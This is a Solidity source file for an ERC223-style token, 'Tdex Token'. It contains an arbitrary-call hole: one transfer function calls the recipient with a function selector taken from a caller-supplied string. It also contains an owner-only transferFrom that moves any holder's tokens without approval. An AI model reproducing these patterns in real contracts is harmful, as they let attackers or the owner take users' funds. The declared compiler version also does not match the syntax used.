1 pragma solidity ^0.4.9;
2  
3 
4 contract SafeMath {
5     uint256 constant public MAX_UINT256 =
6     0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;
7 
8     function safeAdd(uint256 x, uint256 y) pure internal returns (uint256 z) {
9         if (x > MAX_UINT256 - y) assert(false);
10         return x + y;
11     }
12 
13     function safeSub(uint256 x, uint256 y) pure internal returns (uint256 z) {
14         if (x < y) assert(false);
15         return x - y;
16     }
17 
18     function safeMul(uint256 x, uint256 y) pure internal returns (uint256 z) {
19         if (y == 0) return 0;
20         if (x > MAX_UINT256 / y) assert(false);
21         return x * y;
22     }
23 }
24 
25 contract ContractReceiver {
26     function tokenFallback(address _from, uint _value, bytes _data) public;
27 }
28  
29 contract TD is SafeMath {
30     
31     event Transfer(address indexed _from, address indexed _to, uint256 _value, bytes _data);
32 
33     mapping(address => uint) balances;
34   
35     string public name    = "Tdex Token";
36     string public symbol  = "TD";
37     uint8 public decimals = 10;
38     uint256 public totalSupply;
39 	address owner;
40   
41     function TD(uint256 _supply, string _name, string _symbol, uint8 _decimals) public
42     {
43         if (_supply == 0) _supply = 10000000000;
44 
45         owner = msg.sender;
46         balances[owner] = _supply;
47         totalSupply = balances[owner];
48 
49         name = _name;
50         decimals = _decimals;
51         symbol = _symbol;
52     }
53   
54   
55   // Function to access name of token .
56   function name() public constant returns (string _name) {
57       return name;
58   }
59   // Function to access symbol of token .
60   function symbol() public constant returns (string _symbol) {
61       return symbol;
62   }
63   // Function to access decimals of token .
64   function decimals() public constant returns (uint8 _decimals) {
65       return decimals;
66   }
67   // Function to access total supply of tokens .
68   function totalSupply() public constant returns (uint256 _totalSupply) {
69       return totalSupply;
70   }
71   
72   
73   // Function that is called when a user or another contract wants to transfer funds .
74   function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
75       
76     if(isContract(_to)) {
77         if (balanceOf(msg.sender) < _value) assert(false);
78         balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
79         balances[_to] = safeAdd(balanceOf(_to), _value);
80         assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
81         emit Transfer(msg.sender, _to, _value, _data);
82         return true;
83     }
84     else {
85         return transferToAddress(_to, _value, _data);
86     }
87 }
88   
89 
90   // Function that is called when a user or another contract wants to transfer funds .
91   function transfer(address _to, uint _value, bytes _data) public returns (bool success) {
92       
93     if(isContract(_to)) {
94         return transferToContract(_to, _value, _data);
95     }
96     else {
97         return transferToAddress(_to, _value, _data);
98     }
99 }
100   
101     // Standard function transfer similar to ERC20 transfer with no _data .
102     // Added due to backwards compatibility reasons .
103     function transfer(address _to, uint _value) public returns (bool success) {
104 
105         //standard function transfer similar to ERC20 transfer with no _data
106         //added due to backwards compatibility reasons
107         bytes memory empty;
108         if(isContract(_to)) {
109             return transferToContract(_to, _value, empty);
110         }
111         else {
112             return transferToAddress(_to, _value, empty);
113         }
114     }
115 
116 	//assemble the given address bytecode. If bytecode exists then the _addr is a contract.
117     function isContract(address _addr) private view returns (bool is_contract) {
118         uint length;
119         assembly {
120         //retrieve the size of the code on target address, this needs assembly
121             length := extcodesize(_addr)
122         }
123         return (length>0);
124     }
125 
126 	//function that is called when transaction target is an address
127     function transferToAddress(address _to, uint _value, bytes _data) private returns (bool success) {
128         if (balanceOf(msg.sender) < _value) assert(false);
129         balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
130         balances[_to] = safeAdd(balanceOf(_to), _value);
131         emit Transfer(msg.sender, _to, _value, _data);
132         return true;
133     }
134   
135   //function that is called when transaction target is a contract
136     function transferToContract(address _to, uint _value, bytes _data) private returns (bool success) {
137         if (balanceOf(msg.sender) < _value) assert(false);
138         balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
139         balances[_to] = safeAdd(balanceOf(_to), _value);
140         ContractReceiver receiver = ContractReceiver(_to);
141         receiver.tokenFallback(msg.sender, _value, _data);
142         emit Transfer(msg.sender, _to, _value, _data);
143         return true;
144     }
145 
146     function transferFrom(address _from, address _to, uint256 _value) public {
147         if(!isOwner()) return;
148 
149         if (balances[_from] < _value) return;    
150         if (safeAdd(balances[_to] , _value) < balances[_to]) return;
151 
152         balances[_from] = safeSub(balances[_from],_value);
153         balances[_to] = safeAdd(balances[_to],_value);
154         /* Notifiy anyone listening that this transfer took place */
155         bytes memory empty;
156         emit Transfer(_from, _to, _value,empty);
157     }
158 
159 	function isOwner() public view  
160     returns (bool)  {
161         return owner == msg.sender;
162     }
163 	
164     function balanceOf(address _owner) public constant returns (uint balance) {
165         return balances[_owner];
166     }
167 }